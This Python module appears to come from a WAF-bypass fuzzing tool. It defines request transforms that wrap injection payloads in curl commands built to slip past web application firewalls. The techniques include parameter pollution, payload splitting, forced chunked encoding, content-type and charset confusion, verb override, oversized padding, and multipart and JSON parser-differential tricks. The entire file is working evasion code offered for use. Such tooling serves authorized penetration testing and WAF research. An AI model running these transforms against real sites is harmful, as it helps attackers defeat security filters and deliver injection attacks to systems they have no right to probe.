"""Request-level transforms — an axis orthogonal to payload mutation.

A payload mutator rewrites the *string*. A RequestTransform rewrites the whole
*HTTP request*: where the payload sits, how the body is framed, which verb and
headers are used. Many real WAF bypasses are request-shape tricks (HTTP parameter
pollution, chunked/multipart framing, verb tampering, content-type confusion)
rather than payload encodings, so the search should be able to combine both axes.

Each transform exposes `.name`, `.desc`, and `.build(target, payload) -> list[str]`
returning a full curl argv (or None to fall back to the oracle's default).
"""
from __future__ import annotations

import json
import urllib.parse
from dataclasses import dataclass
from typing import Callable, Optional

from .oracle import Target


@dataclass(frozen=True)
class RequestTransform:
    name: str
    desc: str
    _build: Callable[[Target, str], Optional[list]]

    def build(self, target: Target, payload: str):
        return self._build(target, payload)


def _base(t: Target) -> list[str]:
    return ["curl", "-sk", "-m", str(t.timeout),
            "-w", "\n%{http_code} %{size_download} %{time_total}",
            "-A", t.user_agent]


def _url(t: Target) -> str:
    return t.url()


# ----------------------------------------------------------------------------- transforms
def _identity(t: Target, payload: str):
    return None  # fall back to Oracle default injection


def _hpp_duplicate(t: Target, payload: str):
    # same param twice: a benign first value, the payload second (or vice-versa).
    url = _url(t)
    sep = "&" if "?" in url else "?"
    q = (urllib.parse.urlencode({t.param: "1"}) + "&" +
         urllib.parse.urlencode({t.param: payload}))
    return _base(t) + ["-X", t.method, f"{url}{sep}{q}"]


def _hpp_split(t: Target, payload: str):
    # split the payload across two instances of the same param (naive concat WAFs miss it)
    half = max(1, len(payload) // 2)
    a, b = payload[:half], payload[half:]
    url = _url(t)
    sep = "&" if "?" in url else "?"
    q = urllib.parse.urlencode({t.param: a}) + "&" + urllib.parse.urlencode({t.param: b})
    return _base(t) + ["-X", t.method, f"{url}{sep}{q}"]


def _chunked_body(t: Target, payload: str):
    # force chunked transfer encoding on a urlencoded body
    body = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/x-www-form-urlencoded",
                       "-H", "Transfer-Encoding: chunked",
                       "--data-binary", body]


def _multipart_body(t: Target, payload: str):
    # multipart/form-data framing; some WAFs parse this differently
    return _base(t) + ["-X", "POST", _url(t), "-F", f"{t.param}={payload}"]


def _json_body(t: Target, payload: str):
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/json",
                       "-d", json.dumps({t.param: payload})]


def _content_type_confusion(t: Target, payload: str):
    # send urlencoded bytes but label them application/json (parser mismatch)
    body = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _verb_override(t: Target, payload: str):
    # keep payload in query but use an unusual verb + override header
    url = _url(t)
    sep = "&" if "?" in url else "?"
    q = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "PUT", f"{url}{sep}{q}",
                       "-H", "X-HTTP-Method-Override: GET"]


def _charset_header(t: Target, payload: str):
    body = urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", "Content-Type: application/x-www-form-urlencoded; charset=ibm037",
                       "--data-binary", body]


def _junk_prefix_param(t: Target, payload: str):
    # large benign parameter before the payload — some WAFs stop inspecting after N bytes
    url = _url(t)
    sep = "&" if "?" in url else "?"
    pad = urllib.parse.urlencode({"padding": "A" * 8000})
    q = pad + "&" + urllib.parse.urlencode({t.param: payload})
    return _base(t) + ["-X", t.method, f"{url}{sep}{q}"]


# ---------------------------------------------------------------- D2 structural / parser-differential
# WAFFLED "split-brain": keep the payload un-obfuscated but distort the request
# ENVELOPE (multipart/JSON/XML framing) so the WAF's body parser misses the field
# while the backend parser still extracts the payload. A whole bypass class that
# needs no payload encoding at all.
def _json_dup_key(t: Target, payload: str):
    k = json.dumps(t.param)
    body = "{" + f'{k}:"ok",{k}:{json.dumps(payload)}' + "}"  # last-key-wins differential
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _json_unicode_key(t: Target, payload: str):
    uk = '"' + "".join(f"\\u{ord(c):04x}" for c in t.param) + '"'  # key the WAF won't match literally
    body = "{" + f"{uk}:{json.dumps(payload)}" + "}"
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _json_array_wrap(t: Target, payload: str):
    body = json.dumps({t.param: [payload]})  # scalar-vs-array parser differential
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "-d", body]


def _json_nested_junk(t: Target, payload: str):
    body = "{" + f'"_":{{"a":1,"b":[1,2,3]}},{json.dumps(t.param)}:{json.dumps(payload)}' + "}"
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/json",
                       "--data-binary", body]


def _mp_dup_disposition(t: Target, payload: str):
    b = "----WAFFENb0undary"
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="decoy"\r\n'
            f'Content-Disposition: form-data; name="{t.param}"\r\n\r\n'
            f"{payload}\r\n--{b}--\r\n")  # two dispositions: which one each parser honours differs
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
                       "--data-binary", body]


def _mp_filename_confusion(t: Target, payload: str):
    b = "----WAFFENb0undary"
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="{t.param}"; filename="x"\r\n\r\n'
            f"{payload}\r\n--{b}--\r\n")  # name+filename: some WAFs treat it as a file upload and skip it
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
                       "--data-binary", body]


def _mp_boundary_whitespace(t: Target, payload: str):
    # declared boundary has trailing space the WAF may keep but the server trims
    b = "----WAFFENb0undary"
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="{t.param}"\r\n\r\n'
            f"{payload}\r\n--{b}--\r\n")
    return _base(t) + ["-X", "POST", _url(t),
                       "-H", f'Content-Type: multipart/form-data; boundary="{b} "',
                       "--data-binary", body]


def _xml_body(t: Target, payload: str):
    esc = (payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
    body = f'<?xml version="1.0"?><root><{t.param}>{esc}</{t.param}></root>'
    return _base(t) + ["-X", "POST", _url(t), "-H", "Content-Type: application/xml",
                       "--data-binary", body]


TRANSFORMS: list[RequestTransform] = [
    RequestTransform("identity", "default injection (no request reshaping)", _identity),
    RequestTransform("hpp_duplicate", "duplicate param: benign then payload", _hpp_duplicate),
    RequestTransform("hpp_split", "split payload across two same-name params", _hpp_split),
    RequestTransform("chunked_body", "POST body with Transfer-Encoding: chunked", _chunked_body),
    RequestTransform("multipart_body", "multipart/form-data framing", _multipart_body),
    RequestTransform("json_body", "application/json body", _json_body),
    RequestTransform("content_type_confusion", "urlencoded bytes labelled as JSON", _content_type_confusion),
    RequestTransform("verb_override", "PUT + X-HTTP-Method-Override", _verb_override),
    RequestTransform("charset_header", "exotic charset in Content-Type", _charset_header),
    RequestTransform("junk_prefix_param", "huge benign param before payload", _junk_prefix_param),
    # D2 structural / parser-differential (WAFFLED split-brain)
    RequestTransform("json_dup_key", "duplicate JSON key (last-wins differential)", _json_dup_key),
    RequestTransform("json_unicode_key", "unicode-escaped JSON key name", _json_unicode_key),
    RequestTransform("json_array_wrap", "payload as a JSON array value", _json_array_wrap),
    RequestTransform("json_nested_junk", "payload after nested JSON junk", _json_nested_junk),
    RequestTransform("mp_dup_disposition", "multipart: two Content-Disposition lines", _mp_dup_disposition),
    RequestTransform("mp_filename_confusion", "multipart: name + filename on one part", _mp_filename_confusion),
    RequestTransform("mp_boundary_whitespace", "multipart: trailing space in boundary", _mp_boundary_whitespace),
    RequestTransform("xml_body", "payload inside an XML element", _xml_body),
]
# transforms that reshape the request STRUCTURE (parser-differential), a distinct axis
STRUCTURAL = {"json_dup_key", "json_unicode_key", "json_array_wrap", "json_nested_junk",
              "mp_dup_disposition", "mp_filename_confusion", "mp_boundary_whitespace", "xml_body"}

BY_NAME = {t.name: t for t in TRANSFORMS}


def get(name: str) -> RequestTransform:
    return BY_NAME[name]


def select(names: set[str] | None = None) -> list[RequestTransform]:
    if not names:
        return list(TRANSFORMS)
    expanded: set[str] = set()
    for n in names:
        if n == "all":
            return list(TRANSFORMS)
        if n == "structural":
            expanded |= STRUCTURAL
        else:
            expanded.add(n)
    return [t for t in TRANSFORMS if t.name in expanded]
